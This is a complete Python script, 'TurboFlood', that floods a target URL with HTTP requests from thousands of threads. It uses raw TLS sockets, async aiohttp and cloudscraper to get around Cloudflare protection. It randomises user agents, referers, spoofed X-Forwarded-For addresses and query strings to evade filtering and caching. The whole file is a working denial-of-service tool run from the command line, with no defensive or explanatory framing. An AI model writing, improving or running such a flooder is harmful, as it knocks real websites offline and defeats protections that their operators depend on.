import threading
import random
import string
import time
import socket
import ssl
import certifi
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
import pyhttpx
import cloudscraper
import asyncio
import aiohttp
import socks
import numpy as np

class AtomicCounter:
    def __init__(self):
        self.value = 0
        self._lock = threading.Lock()
    def increment(self, amount=1):
        with self._lock:
            self.value += amount

class TurboFlood:
    def __init__(self, url, duration, threads=5000):
        self.url = url
        self.duration = duration
        self.threads = threads
        self.counter = AtomicCounter()
        self.failed = AtomicCounter()
        self.ua = UserAgent()
        self.scraper = cloudscraper.create_scraper(browser={'browser': 'chrome','platform': 'windows','mobile': False})
        self.session = pyhttpx.HttpSession(http2=True)
        self.stop_event = threading.Event()
        self.sockets = []
        self.parsed_url = urllib.parse.urlparse(url)
        self.host = self.parsed_url.netloc
        self.path = self.parsed_url.path or '/'
        self.ssl_context = self._create_ssl_context()
        self.user_agents = [self.ua.random for _ in range(1000)]
        self.referers = [f'https://www.{x}.com/' for x in ['google','bing','yahoo','duckduckgo']]
        self.ips = [f'{x}.{y}.{z}.{w}' for x in range(1,255) for y in range(1,255) for z in range(1,3) for w in range(1,3)]

    def _create_ssl_context(self):
        ctx = ssl.create_default_context(cafile=certifi.where())
        ctx.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        ctx.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
        return ctx

    def _generate_query(self):
        return f'{random.choice(string.ascii_lowercase)}{random.randint(1000,9999)}={random.randint(1000000000,9999999999)}'

    def _get_random_ua(self):
        return random.choice(self.user_agents)

    def _build_headers(self):
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': random.choice(['en-US,en;q=0.9','pt-BR,pt;q=0.8']),
            'Cache-Control': random.choice(['no-cache','max-age=0','no-store']),
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self._get_random_ua(),
            'X-Forwarded-For': random.choice(self.ips),
            'Referer': random.choice(self.referers),
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-User': '?1'
        }
        return headers

    async def _async_flood(self):
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, limit=0)) as session:
            while not self.stop_event.is_set():
                try:
                    async with session.get(self.url, params={self._generate_query(): ''}, headers=self._build_headers(), timeout=5) as resp:
                        self.counter.increment()
                except:
                    self.failed.increment()

    def _socket_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        try:
            sock.connect((self.host, 443))
            ssock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
            while not self.stop_event.is_set():
                try:
                    query = self._generate_query()
                    headers = self._build_headers()
                    request = f"GET {self.path}?{query} HTTP/1.1\r\nHost: {self.host}\r\n"
                    for k, v in headers.items():
                        request += f"{k}: {v}\r\n"
                    request += "\r\n"
                    ssock.sendall(request.encode())
                    ssock.recv(1024)
                    self.counter.increment()
                except:
                    self.failed.increment()
                    break
            ssock.close()
        except:
            pass

    def _cloudflare_bypass(self):
        while not self.stop_event.is_set():
            try:
                self.scraper.get(self.url, params={self._generate_query(): ''}, headers=self._build_headers(), timeout=5)
                self.counter.increment()
            except:
                self.failed.increment()

    def run(self):
        timer = threading.Timer(self.duration, self.stop_event.set)
        timer.start()
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(int(self.threads*0.3)):
                executor.submit(self._socket_flood)
            for _ in range(int(self.threads*0.4)):
                executor.submit(self._cloudflare_bypass)
            for _ in range(int(self.threads*0.3)):
                executor.submit(lambda: loop.run_until_complete(self._async_flood()))
        
        loop.close()
        return {'total': self.counter.value, 'failed': self.failed.value}

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 3:
        sys.exit()
    
    url = sys.argv[1]
    duration = int(sys.argv[2])
    
    flood = TurboFlood(url, duration, threads=5000)
    stats = flood.run()
    
    print(f"Total: {stats['total']}")
    print(f"Failed: {stats['failed']}")
